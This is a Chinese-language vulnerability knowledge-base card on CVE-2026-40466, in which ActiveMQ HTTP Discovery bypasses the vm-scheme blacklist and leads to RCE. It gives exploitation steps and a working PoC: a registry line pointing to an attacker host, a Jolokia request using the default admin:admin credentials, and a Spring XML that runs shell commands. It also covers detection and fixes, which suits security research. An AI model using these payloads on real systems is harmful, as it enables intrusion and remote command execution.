---
id: web-java-component-activemq-jolokia-http-discovery-second-stage-vm-bypass
title: ActiveMQ Jolokia HTTP Discovery 二级 URI 绕过 vm 黑名单致 RCE（CVE-2026-40466）
type: scenario
domain: web
path: web/java/component
technique: activemq-jolokia-http-discovery-second-stage-vm-bypass
tags:
- java
- activemq
- jolokia
- discovery
- jmx
- xbean
- rce
- cve-2026-40466
cve:
- CVE-2026-40466
severity: critical
confidence: high
status: verified
affected_versions: Apache ActiveMQ Broker/All <5.19.6、6.0.0–6.2.4；修复版本 5.19.6/6.2.5（原文公告标记）
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-42
  verified_at: '2026-11-05T06:30:58+08:00'
  notes: 已对照原文与61张截图核对：CVE-2026-40466 公告（Broker/All <5.19.6、6.0.0–6.2.4，修复 5.19.6/6.2.5，需 activemq-http）；34197 修复在 BrokerView.addNetworkConnector 增加 validateAllowedUrl/validateAllowedScheme 拒绝 vm（img/24）；HTTPDiscoveryAgentFactory.doCreateDiscoveryAgent 将去掉 query 的 URI 设为 registryURL（img/22/23）；调试栈 HTTPDiscoveryAgent.doLookup→DiscoveryNetworkConnector.onServiceAdd→TransportFactory.connect→VMTransportFactory.doCompositeConnect→XBeanBrokerFactory.createApplicationContext，连接 URI 为注册表返回的 vm://...brokerConfig=xbean:http://.../evil.xml（img/21/25）；PoC 输出 registry/evil.xml 均 200、Jolokia 返回 NC status 200、/tmp/pwned01.txt 生成（img/17/18）均一致。小瑕疵：变体段关联卡片 [[web-java-component-activemq-jolokia-addnetworkconnector-vm-xbean-rce]] id 不存在，实际应为 [[web-java-component-activemq-jolokia-networkconnector-xbean-rce]]，建议作者修正。未在本机复现。
url: /docs/web/java/component/web-java-component-activemq-jolokia-http-discovery-second-stage-vm-bypass/
draft: false
kb_aliases:
- CVE-2026-40466
- ActiveMQ HTTP Discovery RCE
- CVE-2026-34197 bypass
- HTTP discovery second-stage URI
- addNetworkConnector HTTP registry
---

## 一句话结论

CVE-2026-34197 的修复只在 `BrokerView.addNetworkConnector/addConnector` 入口拒绝 `vm` 协议，但 HTTP Discovery 的注册表响应是第二阶段输入：攻击者让 ActiveMQ 添加一个合法的 `http://attacker/registry` connector，注册表返回一行 `vm://...?brokerConfig=xbean:http://attacker/evil.xml`，`DiscoveryNetworkConnector.onServiceAdd` 未再校验就 `TransportFactory.connect`，从而重新走到远程 Spring XML 的 `init-method` 命令执行。

## 原理

- **修复的盲区**：CVE-2026-34197 修复后，`BrokerView.addNetworkConnector` 会解析传入 URI 并对主 scheme 及复合 URI 的每个 component 调用 `validateAllowedScheme`，发现 `vm` 即抛异常；同时 `XBeanBrokerFactory` 限制远程协议。这挡住了第一层 `vm://`，但没有覆盖 connector 后续从注册表拿到的地址。
- **HTTP Discovery 模型**：`HTTPDiscoveryAgentFactory.doCreateDiscoveryAgent` 从 `http://host/discovery-registry/default` 这类 URI 构造 `HTTPDiscoveryAgent`，把去掉查询串的 URI 设为 `registryURL`。Agent 周期性 GET 注册表，响应体按行返回“当前可用 broker 的 service URI”。
- **第二阶段未校验**：`DiscoveryNetworkConnector.onServiceAdd(DiscoveryEvent)` 把注册表返回的每一行都当作可信 transport URI，直接调用 `TransportFactory.connect(connectUri)`。这里没有复用入口的 scheme 校验，因此注册表可以返回 `vm://...`。
- **回到同一 sink**：`VMTransportFactory.doCompositeConnect` 再次从 `brokerConfig` 取出 `xbean:http://.../evil.xml`，`XBeanBrokerFactory` 远程加载 Spring XML，`ResourceXmlApplicationContext.refresh()` 实例化 bean 并执行 `init-method`（如 `ProcessBuilder.start`）。因此本漏洞是 34197 的“二级输入绕过”，最终危害与利用链相同。
- **前置模块**：公告明确要求 classpath 上存在 `activemq-http` 模块；否则 `http` discovery transport 不可用。
- **修复**：受影响版本升级到 5.19.6/6.2.5；修复应同时校验 discovery 返回的第二阶段 URI，而不只是入口参数。

## 触发条件

- 目标为 Apache ActiveMQ 受影响版本（原文公告：Broker/All <5.19.6，6.0.0–6.2.4；修复 5.19.6/6.2.5）。
- 目标 classpath 含 `activemq-http` 模块。
- 攻击者能访问 Jolokia 并持有有效凭据（默认 `admin:admin`），且 `org.apache.activemq:*` 的 `operation` 可执行。
- 攻击者可提供一个 HTTP 注册表端点，返回恶意 `vm://...` 行；目标能访问该端点。
- 目标能访问第二阶段的 `evil.xml`（同一攻击者 HTTP 服务即可）。

## 利用步骤

1. 在攻击者服务器准备两个端点：
   - `/discovery-registry/default`：响应体返回一行 `vm://poc?brokerConfig=xbean:http://attacker:18080/evil.xml`；
   - `/evil.xml`：与 CVE-2026-34197 相同的恶意 Spring XML（`ProcessBuilder` + `init-method="start"`）。
2. 通过 Jolokia 调用 `addNetworkConnector(java.lang.String)`，参数为 `http://attacker:18080/discovery-registry/default?updateInterval=1000`。入口校验只看到 `http`，放行。
3. `HTTPDiscoveryAgent` 轮询注册表，收到恶意 `vm://` 行；`DiscoveryNetworkConnector.onServiceAdd` 调用 `TransportFactory.connect`，进入 `VMTransportFactory.doCompositeConnect`。
4. `XBeanBrokerFactory` 拉取 `evil.xml` 并 `refresh()`，`ProcessBuilder.start` 执行命令。
5. 观察攻击者 HTTP 日志：先出现注册表 GET，随后出现两次 `evil.xml` GET（原文复现中目标拉取两次）；Jolokia 返回 `"value": "NC"`、`status: 200`。
6. 清理：调用 `removeNetworkConnector` 删除 `NC`；若靶场预置同名 connector，先删除再添加。

## PoC

恶意注册表响应（纯文本，一行一个 service URI）：

```text
vm://poc?brokerConfig=xbean:http://attacker:18080/evil.xml
```

添加 HTTP Discovery connector：

```http
POST /api/jolokia HTTP/1.1
Host: target:8161
Authorization: Basic YWRtaW46YWRtaW4=
Origin: http://target:8161
Content-Type: application/json
Connection: close

{
  "type": "exec",
  "mbean": "org.apache.activemq:type=Broker,brokerName=localhost",
  "operation": "addNetworkConnector(java.lang.String)",
  "arguments": ["http://attacker:18080/discovery-registry/default?updateInterval=1000"]
}
```

`evil.xml` 与 CVE-2026-34197 相同：

```xml
<beans xmlns="http://www.springframework.org/schema/beans">
  <bean id="cmd" class="java.lang.ProcessBuilder" init-method="start">
    <constructor-arg>
      <list><value>/bin/sh</value><value>-c</value><value>touch /tmp/PWNED_40466</value></list>
    </constructor-arg>
  </bean>
  <bean id="broker" class="org.apache.activemq.xbean.XBeanBrokerService">
    <property name="brokerName" value="poc"/>
    <property name="persistent" value="false"/>
  </bean>
</beans>
```

清理：

```json
{
  "type": "exec",
  "mbean": "org.apache.activemq:type=Broker,brokerName=localhost",
  "operation": "removeNetworkConnector(java.lang.String)",
  "arguments": ["NC"]
}
```

## 变体与关联

- **注册表返回多行**：可一次返回多个 `vm://` URI，或混入正常 broker 地址，降低流量特征；`onServiceAdd` 会逐行处理。
- **其他 discovery agent**：`DiscoveryNetworkConnector` 还支持 `simple`、`multicast`、`zeroconf` 等发现方式；凡是能把外部/半可信地址送入 `onServiceAdd` 的路径都值得检查是否同样缺少第二阶段校验。
- **同一 sink 的其他入口**：`addConnector`、broker XML 配置、JMX 直接创建 connector 等；本卡仅覆盖 Jolokia 入口。
- 关联卡片：[[web-java-component-activemq-jolokia-addnetworkconnector-vm-xbean-rce]]、[[web-java-deserialization-activemq-openwire-throwable-constructor-rce]]。

## 检测与防御

- **流量/日志**：Jolokia `addNetworkConnector` 参数中出现 `http://.../discovery-registry`、`updateInterval`、`freshness` 等 discovery 关键字；随后 ActiveMQ 向外部发起注册表 GET 并拉取 XML。注册表响应中出现 `vm://`、`brokerConfig=`、`xbean:` 是强特征。
- **主机/网络**：`HTTPDiscoveryAgent.doLookup` 访问非业务注册表；`DiscoveryNetworkConnector.onServiceAdd` 的 `connectUri` 为 `vm://`；`XBeanBrokerFactory.createApplicationContext` 加载远程 HTTP 资源；`ProcessBuilder.start` 在 broker 配置校验前执行。
- **防御**：升级到 5.19.6/6.2.5 或更高；对 discovery 返回的第二阶段 URI 做与入口相同的 scheme/协议校验；Jolokia 禁用 `exec` 或限制 `org.apache.activemq:*` 操作；修改默认口令；限制 ActiveMQ 出网与可访问的注册表域名；不使用不可信 discovery registry。
- **排查**：枚举 `NetworkConnectorView` 与 `DiscoveryNetworkConnector` 的 `discoveryUri`，检查是否有指向外部 HTTP 的 connector；抓取 ActiveMQ 出站 HTTP 请求与 DNS 解析；重启 broker 清除内存 connector。
